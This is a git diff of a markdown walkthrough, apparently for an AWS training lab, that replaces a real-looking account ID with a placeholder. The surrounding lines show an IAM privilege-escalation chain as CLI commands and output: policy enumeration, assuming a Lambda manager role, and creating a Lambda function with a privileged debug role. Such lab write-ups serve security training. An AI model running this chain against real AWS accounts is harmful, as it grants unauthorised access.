@@ -29,12 +29,12 @@ Our username is `chris-cgidqyneyhh86l`. Using the username we can enumerate the 
 ![enumerate policies](image-2.png)
 We can see that there is one attached policy called `cg-chris-policy-cgidqyneyhh86l`. We can try to read the policy document. For that, first we need to get the default version of the policy and then get that version.
 ```json
-//aws iam get-policy --profile chris --policy-arn "arn:aws:iam::139343766080:policy/cg-chris-policy-cgidqyneyhh86l"
+//aws iam get-policy --profile chris --policy-arn "arn:aws:iam::1234567890:policy/cg-chris-policy-cgidqyneyhh86l"
 {
     "Policy": {
         "PolicyName": "cg-chris-policy-cgidqyneyhh86l",
         "PolicyId": "ANPASA4MJEJAEPBI34C2J",
-        "Arn": "arn:aws:iam::139343766080:policy/cg-chris-policy-cgidqyneyhh86l",
+        "Arn": "arn:aws:iam::1234567890:policy/cg-chris-policy-cgidqyneyhh86l",
         "Path": "/",
         "DefaultVersionId": "v1",
         "AttachmentCount": 1,
@@ -61,7 +61,7 @@ We can see that there is one attached policy called `cg-chris-policy-cgidqyneyhh
 }
 ```
 ```json
-//aws iam get-policy-version --profile chris --policy-arn "arn:aws:iam::139343766080:policy/cg-chris-policy-cgidqyneyhh86l" --version-id v1
+//aws iam get-policy-version --profile chris --policy-arn "arn:aws:iam::1234567890:policy/cg-chris-policy-cgidqyneyhh86l" --version-id v1
 {
     "PolicyVersion": {
         "Document": {
@@ -93,7 +93,7 @@ Here, we can see that we have the `sts:AssumeRole` policy which can be used for 
     "Path": "/",
     "RoleName": "cg-debug-role-cgidqyneyhh86l",
     "RoleId": "AROASA4MJEJACOMSAOQO6",
-    "Arn": "arn:aws:iam::139343766080:role/cg-debug-role-cgidqyneyhh86l",
+    "Arn": "arn:aws:iam::1234567890:role/cg-debug-role-cgidqyneyhh86l",
     "CreateDate": "2025-06-13T11:32:58Z",
     "AssumeRolePolicyDocument": {
         "Version": "2012-10-17",
@@ -114,7 +114,7 @@ Here, we can see that we have the `sts:AssumeRole` policy which can be used for 
     "Path": "/",
     "RoleName": "cg-lambdaManager-role-cgidqyneyhh86l",
     "RoleId": "AROASA4MJEJAJH5B2ZB45",
-    "Arn": "arn:aws:iam::139343766080:role/cg-lambdaManager-role-cgidqyneyhh86l",
+    "Arn": "arn:aws:iam::1234567890:role/cg-lambdaManager-role-cgidqyneyhh86l",
     "CreateDate": "2025-06-13T11:33:10Z",
     "AssumeRolePolicyDocument": {
         "Version": "2012-10-17",
@@ -122,7 +122,7 @@ Here, we can see that we have the `sts:AssumeRole` policy which can be used for 
             {
                 "Effect": "Allow",
                 "Principal": {
-                    "AWS": "arn:aws:iam::139343766080:user/chris-cgidqyneyhh86l"
+                    "AWS": "arn:aws:iam::1234567890:user/chris-cgidqyneyhh86l"
                 },
                 "Action": "sts:AssumeRole"
             }
@@ -134,14 +134,14 @@ Here, we can see that we have the `sts:AssumeRole` policy which can be used for 
 ```
 There are 2 roles available but only `cg-lambdaManager-role-cgidqyneyhh86l` has the policy which will allow the Principal - arn of chris user(our user) to allow to Assume the role. To assume the role we can use the following command.
 ```bash
-aws sts assume-role --role-arn arn:aws:iam::139343766080:role/cg-lambdaManager-role-cgidqyneyhh86l --role-session-name lambdamanager --profile chris
+aws sts assume-role --role-arn arn:aws:iam::1234567890:role/cg-lambdaManager-role-cgidqyneyhh86l --role-session-name lambdamanager --profile chris
 ```
 This gives us AccessKeyId, SecretAccessKey and a temporary SessionToken. We can configure this as a new profile.
 ![second profile](image-3.png)
 Now lets checkout the policies of the role we have gained access to.
 ![check policy](image-4.png)
 ```json
-//aws iam get-policy-version --profile chris --policy-arn "arn:aws:iam::139343766080:policy/cg-lambdaManager-policy-cgidqyneyhh86l" --version-id v1
+//aws iam get-policy-version --profile chris --policy-arn "arn:aws:iam::1234567890:policy/cg-lambdaManager-policy-cgidqyneyhh86l" --version-id v1
 // v1 was the default policy version
 {
     "PolicyVersion": {
@@ -192,7 +192,7 @@ def lambda_handler(event, context):
 ```bash
 zip lambda.zip lambda.py
 
-aws lambda create-function --function-name my_function --runtime python3.9 --role arn:aws:iam::139343766080:role/cg-debug-role-cgidqyneyhh86l --handler lambda.lambda_handler --zip-file fileb://lambda.zip --region us-east-1 --profile lambdamanager
+aws lambda create-function --function-name my_function --runtime python3.9 --role arn:aws:iam::1234567890:role/cg-debug-role-cgidqyneyhh86l --handler lambda.lambda_handler --zip-file fileb://lambda.zip --region us-east-1 --profile lambdamanager
 ```
 2. Invoke the lambda function. 
 Now if we list the lambda functions, we should see our new function here.
@@ -202,9 +202,9 @@ Now if we list the lambda functions, we should see our new function here.
     "Functions": [
         {
             "FunctionName": "my_function",
-            "FunctionArn": "arn:aws:lambda:us-east-1:139343766080:function:my_function",
+            "FunctionArn": "arn:aws:lambda:us-east-1:1234567890:function:my_function",
             "Runtime": "python3.9",
-            "Role": "arn:aws:iam::139343766080:role/cg-debug-role-cgidqyneyhh86l",
+            "Role": "arn:aws:iam::1234567890:role/cg-debug-role-cgidqyneyhh86l",
             "Handler": "lambda.lambda_handler",
             "CodeSize": 346,
             "Description": "",
